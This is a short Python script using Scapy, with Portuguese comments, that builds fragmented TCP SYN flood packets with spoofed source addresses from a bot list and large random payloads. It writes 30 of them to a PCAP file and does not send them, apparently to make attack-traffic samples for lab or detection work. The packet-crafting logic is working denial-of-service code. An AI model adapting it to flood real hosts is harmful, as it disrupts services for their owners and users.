from scapy.all import *
import random
import time
import ipaddress
import os

TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "bots.txt"
PACKET_PAYLOAD_SIZE = 4000  # Payload grande para forçar fragmentação
FRAGSIZE = 1480             # Tamanho do fragmento (típico para MTU Ethernet)

PCAP_FILENAME = "tcpfrag.pcap"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_tcp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    numero_de_pacotes_enviados = 0
    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        seq_num = random.randint(0, 4294967295)
        tcp_layer = TCP(sport=RandShort(), dport=TARGET_PORT, flags='S', seq=seq_num, window=8192)
        payload = os.urandom(PACKET_PAYLOAD_SIZE)  # Payload aleatório grande

        # Monta o pacote IP/TCP + payload
        packet = ip_layer / tcp_layer / Raw(load=payload)

        # Fragmenta o pacote IP
        fragments = fragment(packet, fragsize=FRAGSIZE)

        # Adiciona cada fragmento encapsulado na camada Ethernet
        for frag in fragments:
            lista_de_pacotes.append(eth_layer / frag)
            numero_de_pacotes_enviados += 1
            if numero_de_pacotes_enviados == 30:
                break
        if numero_de_pacotes_enviados == 30:
            break

    print(f"Gerando arquivo PCAP com {numero_de_pacotes_enviados} pacotes...")
    wrpcap(PCAP_FILENAME, lista_de_pacotes)
    print(f"Arquivo PCAP '{PCAP_FILENAME}' gerado com sucesso.")

if __name__ == "__main__":
    run_tcp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 create-pcap-frag.py